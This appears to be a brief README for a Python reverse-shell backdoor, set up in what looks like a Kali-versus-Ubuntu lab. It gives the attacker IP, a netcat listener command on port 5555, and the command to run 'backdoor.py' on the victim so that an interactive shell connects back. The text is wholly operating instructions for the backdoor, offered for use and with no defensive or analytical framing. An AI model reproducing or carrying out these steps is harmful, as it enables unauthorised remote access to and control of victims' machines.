the backdoor is set to connect to my kali machine at 10.0.2.8
change that to attacker machine IP and run a netcat listener on 
port 5555 with the command nc -v -l -p 5555

run the backdoor on victim ubuntu machine with the command python3 backdoor.py
an interactive shell will be spawned which can be exited with exit or entering a keyboard interrupt.
